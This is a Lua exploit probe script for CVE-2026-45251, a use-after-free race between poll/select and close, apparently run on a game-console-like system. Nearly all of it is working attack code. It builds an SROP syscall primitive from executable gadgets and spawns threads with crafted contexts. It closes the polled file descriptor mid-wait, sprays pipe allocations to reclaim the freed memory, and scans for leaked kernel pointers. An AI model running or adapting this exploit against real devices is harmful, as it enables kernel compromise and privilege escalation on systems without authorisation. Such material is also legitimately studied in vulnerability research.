-- CRASH_CLASS: HIGH
-- PROBE 153b: CVE-2026-45251 poll/close UAF — threaded version
--
-- CVE-2026-45251 (SA-26:19): poll(2)/select(2) holds no reference to the
-- underlying file object while blocked. If another thread closes the fd,
-- the object is freed while poll still has a dangling pointer. When poll
-- wakes, it touches freed memory → UAF.
--
-- Strategy:
-- 1. Create pipe via SROP
-- 2. Spawn child thread that calls poll(pipe_rd, POLLIN, 5000) via thr_create
--    with RIP=sc_addr (libc syscall instruction, XO but executable)
-- 3. Main thread waits briefly, then closes pipe_rd via SROP
-- 4. Main sprays allocations to reuse freed memory
-- 5. Child's poll wakes (POLLNVAL/timeout) → touches freed/reallocated memory
-- 6. Detect corruption/crash via sentinel checks

print("=== PROBE 153b: CVE-2026-45251 POLL/CLOSE UAF v2 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = to_num(memory.read_dword(info + 0x108))
local text_hi = to_num(memory.read_dword(info + 0x10C))
local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot=0x" .. string.format("%X%08X", text_hi, text_lo))

-- Gadgets from eboot .text (RX)
local ret_gadget = uint64(string.format("0x%X%08X", text_hi, text_lo + 0x42))
local store_gadget = uint64(string.format("0x%X%08X", text_hi, text_lo + 0xD0B60))

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = rq(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=0x" .. string.format("%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU mmap for shared memory
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x800000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=0x" .. string.format("%X%08X", gh, gl))

-- [A] Verify poll works from main thread via SROP
print("")
print("--- [A] SROP POLL VERIFICATION ---")
local test_pipe = srop(42)
local tprd = test_pipe and to_num(test_pipe) or -1
local tpwr = tprd + 1
print("test_pipe: rd=" .. tprd .. " wr=" .. tpwr)

-- Set up pollfd struct at gpu+0x10000
-- struct pollfd { int fd; short events; short revents; } = 8 bytes
local PFD = gpu + 0x10000
wd(PFD, tprd)
wd(PFD + 4, 0x0001)  -- events=POLLIN(1), revents=0

-- Non-blocking poll (timeout=0)
local pr = srop(209, ga(0x10000), uint64(1), uint64(0))
local prv = pr and to_num(pr) or -999
print("poll(empty,0ms)=" .. prv)  -- should be 0 (no data)

-- Write data then poll
srop(4, uint64(tpwr), ga(0x10100), uint64(4))
wd(PFD + 4, 0x0001)  -- reset
pr = srop(209, ga(0x10000), uint64(1), uint64(0))
prv = pr and to_num(pr) or -999
local rev = rd(PFD + 6)  -- revents is at offset 6 (short)
print("poll(data,0ms)=" .. prv .. " revents=" .. rev)

-- Drain pipe
srop(3, uint64(tprd), ga(0x10100), uint64(4))

-- Close test pipe
srop(6, uint64(tprd))
srop(6, uint64(tpwr))
print("poll_via_srop=WORKS")

-- [B] Verify child thread can execute syscall at sc_addr
-- Test: child calls getpid(20) and stores result via mov [rdi], rax; ret
print("")
print("--- [B] CHILD THREAD SYSCALL TEST ---")

-- Sentinel in shared mem
local RESULT = gpu + 0x20000
wq(RESULT, uint64("0xDEADDEADDEADDEAD"))

-- Child stack
local CSTACK = gpu + 0x30000
-- Stack layout (top to bottom):
-- [RSP+0] = store_gadget (after syscall;jc;xor;ret → ret pops this)
-- [RSP+8] = ret_gadget (after store, child ret's here → infinite ret chain = eventual crash, which is OK)
wq(CSTACK + 0xF00, store_gadget)    -- return addr after poll/getpid
wq(CSTACK + 0xF08, ret_gadget)      -- after store

-- Build ucontext for thr_create
local uctx = gpu + 0x40000
-- Zero it
for off = 0, 0x4BF, 8 do wq(uctx + off, uint64(0)) end

-- Gates
wd(uctx + 0x108, 0x480)
wd(uctx + 0x0D0, 7)
wd(uctx + 0x110, 0x10000)

-- CS/SS
wd(uctx + 0x0C0, 0x43)
wd(uctx + 0x100, 0x3B)

-- RIP = sc_addr (libc syscall instruction, XO but executable)
wq(uctx + 0x0E0, sc_addr)

-- RSP = child stack top
wq(uctx + 0x0F8, ga(0x30F00))

-- GP registers (ucontext offsets):
-- +0x048=RDI, +0x050=RSI, +0x058=RDX, +0x060=RCX
-- +0x068=R8, +0x070=R9, +0x078=RAX, +0x080=RBX
-- +0x088=RBP, +0x090=R10
wq(uctx + 0x078, uint64(20))         -- RAX = SYS_getpid
wq(uctx + 0x048, ga(0x20000))        -- RDI = RESULT addr (for store gadget)

-- Create thread
local sc_tc = make_syscall(430)
local tidp = gpu + 0x50000
wq(tidp, uint64(0))
local tc_ok = pcall(function() return sc_tc(uint64(uctx), tidp) end)
local tid = rd(tidp)
print("child_tid=" .. tid .. " create=" .. tostring(tc_ok))

-- Wait for child to execute
for i = 1, 200 do srop(20) end

-- Read result
local res = rq(RESULT)
local resh, resl = get_hi_lo(res)
print("child_getpid=0x" .. string.format("%X%08X", resh, resl))
if resl == pid and resh == 0 then
    print("*** CHILD SYSCALL WORKS ***")
elseif resh == 0xDEADDEAD then
    print("child did not write result (may have crashed)")
else
    print("unexpected result — child may have run a different path")
end

-- [C] THE ACTUAL CVE RACE TEST
-- For each round:
-- 1. Create pipe
-- 2. Spawn child calling poll(pipe_rd, POLLIN, 2000) — blocks ~2 sec
-- 3. Main waits briefly, closes pipe_rd
-- 4. Main sprays pipe/socket allocations to fill freed memory
-- 5. Child wakes → touches freed memory → potential UAF
print("")
print("--- [C] POLL/CLOSE RACE ---")

local ROUNDS = 10
local crashes = 0
local alive_post = 0

for round = 1, ROUNDS do
    -- Create pipe
    local pr2 = srop(42)
    local prd = pr2 and to_num(pr2) or -1
    if prd < 0 then
        print("round=" .. round .. " pipe_failed")
        break
    end
    local pwr = prd + 1

    -- Set up pollfd for child
    local pfd_off = 0x60000 + round * 0x100
    wd(gpu + pfd_off, prd)            -- fd
    wd(gpu + pfd_off + 4, 0x0001)     -- events=POLLIN, revents=0

    -- Child result storage
    local res_off = 0x70000 + round * 0x10
    wq(gpu + res_off, uint64("0xBBBBBBBBBBBBBBBB"))

    -- Child stack for this round
    local stk_off = 0x80000 + round * 0x1000
    wq(gpu + stk_off + 0xF00, store_gadget)
    wq(gpu + stk_off + 0xF08, ret_gadget)

    -- Build child ucontext
    local uctx2 = gpu + 0x90000
    for off = 0, 0x4BF, 8 do wq(uctx2 + off, uint64(0)) end
    wd(uctx2 + 0x108, 0x480)
    wd(uctx2 + 0x0D0, 7)
    wd(uctx2 + 0x110, 0x10000)
    wd(uctx2 + 0x0C0, 0x43)
    wd(uctx2 + 0x100, 0x3B)
    wq(uctx2 + 0x0E0, sc_addr)                    -- RIP = syscall
    wq(uctx2 + 0x0F8, ga(stk_off + 0xF00))        -- RSP
    wq(uctx2 + 0x078, uint64(209))                 -- RAX = SYS_poll
    wq(uctx2 + 0x048, ga(pfd_off))                 -- RDI = &pollfd (also store target)
    wq(uctx2 + 0x050, uint64(1))                   -- RSI = nfds
    wq(uctx2 + 0x058, uint64(2000))                -- RDX = timeout 2000ms

    -- Spawn child
    wq(tidp, uint64(0))
    local tc2_ok = pcall(function() return sc_tc(uint64(uctx2), tidp) end)
    local tid2 = rd(tidp)

    -- Brief delay so child enters poll()
    for i = 1, 50 do srop(20) end

    -- CLOSE THE FD while child is in poll — this is the CVE trigger!
    srop(6, uint64(prd))

    -- Spray: create many new pipes to fill freed memory
    local spray_fds = {}
    for s = 1, 8 do
        local sp = srop(42)
        if sp then
            spray_fds[s] = to_num(sp)
        end
    end

    -- Wait for child poll to timeout or return
    for i = 1, 300 do srop(20) end

    -- Check child's stored result (poll return value stored by mov [rdi], rax)
    local cres = rq(gpu + pfd_off)
    local crh, crl = get_hi_lo(cres)

    -- Check pollfd revents
    local crev = rd(gpu + pfd_off + 4)
    local events_lo = crev % 65536
    local revents_hi = math.floor(crev / 65536)

    -- Check for kernel pointers in child's stack area (sign of corruption)
    local kptrs = 0
    for off = 0, 0x80, 8 do
        local ok2, v2 = pcall(function() return rq(gpu + stk_off + off) end)
        if ok2 then
            local vh, vl = get_hi_lo(v2)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                kptrs = kptrs + 1
                print("  KPTR round=" .. round .. " stk+" .. string.format("%02X", off)
                    .. "=0x" .. string.format("%X%08X", vh, vl))
            end
        end
    end

    -- Check spray fds for corruption
    local spray_corruption = false
    for s = 1, #spray_fds do
        if spray_fds[s] == prd then
            -- The freed fd number was reused — good for UAF
            spray_corruption = true
        end
    end

    -- Check if process is still alive
    local ppid = srop(20)
    local ppv = ppid and to_num(ppid) or -999
    if ppv == pid then alive_post = alive_post + 1 end

    print("round=" .. round .. " tid=" .. tid2 .. " poll_result=0x" .. string.format("%X%08X", crh, crl)
        .. " fd_reused=" .. tostring(spray_corruption) .. " kptrs=" .. kptrs .. " alive=" .. tostring(ppv == pid))

    -- Cleanup spray
    srop(6, uint64(pwr))
    for s = 1, #spray_fds do
        if spray_fds[s] then
            srop(6, uint64(spray_fds[s]))
            srop(6, uint64(spray_fds[s] + 1))
        end
    end
end

print("total_rounds=" .. ROUNDS .. " alive_post=" .. alive_post)

-- [D] select(2) variant — same CVE affects select too
print("")
print("--- [D] SELECT/CLOSE RACE ---")

for round = 1, 5 do
    -- Create pipe
    local pr3 = srop(42)
    local prd3 = pr3 and to_num(pr3) or -1
    if prd3 < 0 then break end
    local pwr3 = prd3 + 1

    -- Set up fd_set for select (just the one bit)
    local fds_off = 0xA0000 + round * 0x100
    wq(gpu + fds_off, uint64(0))
    local bit_val = 1
    for i = 1, prd3 do bit_val = bit_val * 2 end
    if prd3 < 32 then
        wd(gpu + fds_off, bit_val)
    else
        wd(gpu + fds_off + 4, math.floor(bit_val / 0x100000000))
    end

    -- Timeout: 2 seconds
    local tv_off = fds_off + 0x20
    wq(gpu + tv_off, uint64(2))     -- tv_sec = 2
    wq(gpu + tv_off + 8, uint64(0)) -- tv_usec = 0

    -- Child result
    local res3_off = 0xB0000 + round * 0x10
    wq(gpu + res3_off, uint64("0xCCCCCCCCCCCCCCCC"))

    -- Child stack
    local stk3_off = 0xC0000 + round * 0x1000
    wq(gpu + stk3_off + 0xF00, store_gadget)
    wq(gpu + stk3_off + 0xF08, ret_gadget)

    -- Build child ucontext for select(93)
    local uctx3 = gpu + 0xD0000
    for off = 0, 0x4BF, 8 do wq(uctx3 + off, uint64(0)) end
    wd(uctx3 + 0x108, 0x480)
    wd(uctx3 + 0x0D0, 7)
    wd(uctx3 + 0x110, 0x10000)
    wd(uctx3 + 0x0C0, 0x43)
    wd(uctx3 + 0x100, 0x3B)
    wq(uctx3 + 0x0E0, sc_addr)
    wq(uctx3 + 0x0F8, ga(stk3_off + 0xF00))
    wq(uctx3 + 0x078, uint64(93))                 -- RAX = SYS_select
    wq(uctx3 + 0x048, uint64(prd3 + 1))           -- RDI = nfds
    wq(uctx3 + 0x050, ga(fds_off))                -- RSI = readfds
    wq(uctx3 + 0x058, uint64(0))                  -- RDX = writefds (NULL)
    wq(uctx3 + 0x090, uint64(0))                  -- R10 = exceptfds (NULL) - select uses R10 for arg4
    wq(uctx3 + 0x068, ga(tv_off))                 -- R8 = timeout - select arg5

    -- Spawn child
    wq(tidp, uint64(0))
    pcall(function() return sc_tc(uint64(uctx3), tidp) end)
    local tid3 = rd(tidp)

    -- Delay
    for i = 1, 50 do srop(20) end

    -- Close read fd
    srop(6, uint64(prd3))

    -- Spray
    for s = 1, 8 do srop(42) end

    -- Wait
    for i = 1, 300 do srop(20) end

    -- Check
    local ppid3 = srop(20)
    local ppv3 = ppid3 and to_num(ppid3) or -999
    print("select_round=" .. round .. " tid=" .. tid3 .. " alive=" .. tostring(ppv3 == pid))

    srop(6, uint64(pwr3))
end

print("")
print("pid_final=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
